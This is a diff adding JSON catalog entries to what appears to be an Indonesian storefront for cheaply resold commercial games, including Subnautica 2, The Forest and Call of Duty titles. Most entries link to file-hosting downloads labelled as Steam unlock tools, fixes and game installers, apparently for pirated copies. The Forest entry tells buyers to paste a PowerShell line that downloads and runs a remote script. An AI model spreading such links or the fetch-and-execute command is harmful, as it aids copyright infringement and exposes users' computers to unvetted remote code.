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",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/8H7DZr9H",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "guide",
+        "label": "turorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "guide",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/Fao5DihD",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-05-15T12:50:01.560305+00:00",
+    "genre": "Survival, Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10/11 64-bit",
+        "cpu": "6-core 3GHz+",
+        "gpu": "Dedicated GPU dengan 3GB VRAM",
+        "ram": "12 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 64-bit",
+        "cpu": "8-core 3.5GHz+",
+        "gpu": "Dedicated GPU 6GB VRAM",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "ac9df471-2125-4c07-a3a4-d66e2b7c5633",
+    "title": "Subnautica 2",
+    "price": 350999,
+    "description": "Subnautica 2 adalah game open-world underwater survival terbaru dari Unknown Worlds Entertainment yang membawa pemain ke planet laut alien baru dengan lingkungan lebih besar, lebih berbahaya, dan lebih detail dibanding seri sebelumnya. Pemain harus bertahan hidup dengan menjelajahi kedalaman laut, membangun markas, membuat kendaraan dan alat, sambil mengungkap misteri dunia bawah laut asing yang dipenuhi makhluk raksasa dan ancaman misterius. Untuk pertama kalinya dalam seri Subnautica, game ini juga menghadirkan fitur multiplayer co-op hingga 4 pemain.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/bd4dc053-2421-3037-84c7-a0b95439aea8/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/xVYWfJxh",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "guide",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "guide",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/usQRi3We",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-05-15T10:47:04.616793+00:00",
+    "genre": "Open World, Survival, Adventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10/11 64-bit",
+        "cpu": "Intel Core i5 / Ryzen 5",
+        "gpu": "GTX 1060 / RX 580",
+        "ram": "16 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i7 / Ryzen 7",
+        "gpu": "RTX 3060 / RX 6700 XT",
+        "ram": "32 GB"
+      }
+    },
+    "discount_price": 19998,
+    "is_trending": true,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "d59cb7fd-14b8-4d00-9c93-7fe4c80788c6",
+    "title": "The Forest",
+    "price": 108999,
+    "description": "The Forest adalah game open-world survival horror di mana pemain berperan sebagai Eric LeBlanc, satu-satunya penyintas kecelakaan pesawat yang terdampar di pulau misterius penuh mutan kanibal. Tujuan utama pemain adalah bertahan hidup sambil mencari anaknya yang hilang bernama Timmy. Pemain harus membangun tempat tinggal, mencari makanan, membuat senjata, menjelajahi gua gelap, dan menghadapi makhluk mengerikan yang semakin agresif di malam hari. Game ini terkenal karena atmosfer survival yang tegang, sistem crafting mendalam, dan AI musuh yang cukup realistis.",
+    "thumbnail": "https://image.api.playstation.com/cdn/EP0238/CUSA12398_00/QABZIx8Ubf69EcsYvaiC1Zx0PPON7XvG.png",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/famddGx3",
+        "icon": "fix",
+        "label": "Fix / Update"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "guide",
+        "label": "Tutorial / Guide"
+      }
+    ],
+    "created_at": "2026-05-21T11:03:16.919709+00:00",
+    "genre": "Survival, Horror, Open World",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7 64-bit",
+        "cpu": "Intel Dual-Core 2.4 GHz",
+        "gpu": "NVIDIA GeForce 8800GT",
+        "ram": "4 GB"
+      },
+      "recommended": {
+        "os": "Windows 10/11 (64-bit)",
+        "cpu": "Quad Core Processor",
+        "gpu": "NVIDIA GeForce GTX 560",
+        "ram": "4 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "jika di steam library game belum bertambah make kalian buka powershell dan pastekan script tersebut irm \"https://luatools.vercel.app/CloudRedirect.ps1\" | iex",
+    "release_type": "instant",
+    "steam_appid": "",
+    "voratools_link": "https://vzdwtudduxjvxjniyexm.supabase.co/storage/v1/object/public/game-assets/voratools/0.7448091709952948.zip"
+  },
+  {
+    "id": "8146d3ca-bb30-404b-b5ac-7dc5083199f5",
+    "title": "Call Of Duty Modern Warfare",
+    "price": 891000,
+    "description": "Call of Duty: Modern Warfare adalah game first-person shooter (FPS) bertema perang modern yang menghadirkan kampanye sinematik, pertempuran taktis yang intens, serta mode multiplayer kompetitif. Pemain akan mengikuti operasi militer di berbagai lokasi dunia dengan beragam senjata, kendaraan, dan misi yang menegangkan.",
+    "thumbnail": "https://tse4.mm.bing.net/th/id/OIP.hA86I5opwE79PL7sGU1uZAHaHa?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/yPCFP1bj",
+        "icon": "tool",
+        "label": "Steamtools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/gL6LRLQv",
+        "icon": "fix",
+        "label": "File fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CHvAnwLB",
+        "icon": "guide",
+        "label": "Tutorial FIx"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "guide",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/3U86t1pU",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-06-05T01:44:12.693774+00:00",
+    "genre": "FPS, Action",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64-bit (v.1709 or higher)",
+        "cpu": "Intel Core i3-4340 or AMD FX-6300",
+        "gpu": "NVIDIA GeForce GTX 670 / GeForce GTX 1650 or Radeon HD 7950",
+        "ram": "8GB RAM"
+      },
+      "recommended": {
+        "os": "Windows 10 64-bit (latest update)",
+        "cpu": "Intel Core i5-2500K or AMD Ryzen R5 1600X processor",
+        "gpu": "NVIDIA GeForce GTX 970 / GTX 1660 or Radeon R9 390 / AMD RX 580",
+        "ram": "12GB RAM"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "9ea48bbd-7877-4f78-a904-25f1a91f093c",
+    "title": "Call Of Duty Modern Warfare 2 (2009)",
+    "price": 299000,
+    "description": "Call of Duty: Modern Warfare II menghadirkan pengalaman perang modern yang intens melalui kampanye cerita sinematik, mode multiplayer kompetitif, serta mode kooperatif. Pemain akan mengikuti operasi pasukan elit dalam berbagai misi berisiko tinggi di berbagai belahan dunia, menggunakan persenjataan modern, strategi taktis, dan kerja sama tim untuk menyelesaikan objektif serta menghadapi ancaman global. Game ini dikenal karena grafis realistis, gameplay cepat, dan variasi mode permainan yang beragam.",
+    "thumbnail": "https://tse3.mm.bing.net/th/id/OIP.3VzcGMeB51-gPhuSlgQIWwHaHa?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/yPCFP1bj",
+        "icon": "tool",
+        "label": "Steamtools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/VLQ8Lq3V",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CHvAnwLB",
+        "icon": "guide",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "guide",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/7SQzfKrM",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-06-05T01:52:04.567768+00:00",
+    "genre": "FPS, Action",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": " Windows 10 64 Bit (latest update)†",
+        "cpu": "Intel Core i3-6100 / Core i5-2500K or AMD Ryzen 3 1200",
+        "gpu": "NVIDIA GeForce GTX 960 or AMD Radeon RX 470",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 64 Bit (latest update) or Windows 11 64 Bit (latest update)†",
+        "cpu": "Intel Core i5-6600K / Core i7-4770 or AMD Ryzen 5 1400",
+        "gpu": "NVIDIA GeForce GTX 1060, AMD Radeon RX 580 or Intel Arc A770",
+        "ram": "12 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "50990648-4b65-493b-8504-ed9998434413",
+    "title": "Call Of Duty Modern Warfare 3 (2011)",
+    "price": 599000,
+    "description": "Call of Duty: Modern Warfare III adalah game bergenre First-Person Shooter (FPS), action, dan military shooter yang melanjutkan cerita dari Modern Warfare II. Pemain kembali mengikuti Captain Price dan Task Force 141 dalam menghadapi ancaman global dari Vladimir Makarov melalui kampanye sinematik, mode multiplayer kompetitif, serta mode Zombies berskala besar. Game ini menghadirkan pertempuran modern yang intens, beragam senjata dan perlengkapan militer, serta gameplay yang menggabungkan aksi cepat, strategi taktis, dan kerja sama tim.",
+    "thumbnail": "https://tse4.mm.bing.net/th/id/OIP.eB13UMntw7B6nxZqCOg6CAHaHa?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/yPCFP1bj",
+        "icon": "tool",
+        "label": "Steamtools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/UgGSLDvT",
+        "icon": "fix",
+        "label": "File fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CHvAnwLB",
+        "icon": "guide",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "guide",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/Ga2MLtpr",
+        "icon": "box",
+        "label": "install games"
+      }
+    ],
+    "created_at": "2026-06-05T01:59:28.083186+00:00",
+    "genre": "Action, FPS",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64 Bit (latest update)*",
+        "cpu": "Intel Core i3-6100 or AMD Ryzen 3 1200",
+        "gpu": "NVIDIA GeForce GTX 960 / GTX 1650 or AMD Radeon RX 470",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 64 Bit (latest update) or Windows 11 64 Bit (latest update)*",
+        "cpu": "Intel Core i7-6700K or AMD Ryzen 5 1600X",
+        "gpu": "NVIDIA GeForce GTX 1080Ti / RTX 3060 or AMD Radeon RX 6600XT or Intel Arc A770",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "21ca8da9-6f05-4a27-aa11-cf642e9a7417",
+    "title": "Lethal Company",
+    "price": 90999,
+    "description": "Lethal Company adalah permainan video yang dikembangkan oleh Zeekerss dan dirilis dalam akses awal pada 23 Oktober 2023. Game ini mengambil latar belakang di dunia retrofuturistik pasca-kiamat, di mana pemain berperan sebagai karyawan kontrak yang bekerja untuk perusahaan bernama \"The Company.\" Tugas pemain adalah mengumpulkan rongsokan dari planet-planet yang ditinggalkan sambil menghindari jebakan, bahaya lingkungan, dan monster yang mengancam.",
+    "thumbnail": "https://static0.gamerantimages.com/wordpress/wp-content/uploads/2024/12/mixcollage-04-dec-2024-07-40-pm-5934.jpg",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/LN9qWWpV",
+        "icon": "tool",
+        "label": "STEAM TOOLS"
+      },
+      {
+        "url": "https://pixeldrain.com/u/kpnQsELE",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/7rLcTs3Z",
+        "icon": "book",
+        "label": "TUTORIAL Fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JwMzS5La",
+        "icon": "box",
+        "label": "Insall game"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "book",
+        "label": "Tutorial Install"
+      }
+    ],
+    "created_at": "2026-04-19T19:59:50.242305+00:00",
+    "genre": "Horror, Survival",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel Core i5-7400",
+        "gpu": "NVIDIA GTX 1050",
+        "ram": "4 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel Core i5-9400F CPU",
+        "gpu": "NVIDIA GeForce GTX 1660 GPU",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 5000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": "1966720",
+    "voratools_link": null
+  },
+  {
+    "id": "494ea30b-7bf6-42a1-af6a-17437762e5b7",
+    "title": "Resident Evil Requiem",
+    "price": 910000,
+    "description": "Resident Evil Requiem berlatar 30 tahun setelah kehancuran Raccoon City, berfokus pada analis FBI, Grace Ashcroft (putri Alyssa Ashcroft dari RE Outbreak), yang menyelidiki kematian misterius di hotel terbengkalai tempat ibunya terbunuh. Bersama Leon S. Kennedy, mereka mengungkap konspirasi bioterorisme baru, dengan fokus cerita pada warisan trauma, horor psikologis, dan efek jangka panjang virus",
+    "thumbnail": "https://imgproxy.eneba.games/jJzx9BMNhN88CD0SonAZSHwPgvu56wVUfGs2IMbGxYI/rs:fit:300/ar:1/czM6Ly9wcm9kdWN0/cy5lbmViYS5nYW1l/cy9wcm9kdWN0cy9C/eWg1TVBub0pJbkdp/cmdHX3pISzlwU2ZJ/RnJsMFJURHhRYnNp/WExCTExZLmpwZw",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/DJwwxAr8",
+        "icon": "box",
+        "label": "Game File"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "fix",
+        "label": "Fix / Update"
+      }
+    ],
+    "created_at": "2026-04-16T12:27:50.205844+00:00",
+    "genre": "Action, Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i5-8500 atau AMD Ryzen 5 3500",
+        "gpu": "NVIDIA GeForce GTX 1660 (6GB) atau AMD Radeon RX 5500 XT (8GB)",
+        "ram": " 16 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i7-8700 atau AMD Ryzen 5 5500",
+        "gpu": "NVIDIA GeForce RTX 2060 Super (8GB) atau AMD Radeon RX 6600 (8GB)",
+        "ram": "16 GB (Disarankan 32 GB untuk multitasking yang lebih lancar)"
+      }
+    },
+    "discount_price": 14999,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": "",
+    "voratools_link": "https://vzdwtudduxjvxjniyexm.supabase.co/storage/v1/object/public/game-assets/voratools/0.08929618492227076.zip"
+  }
+]
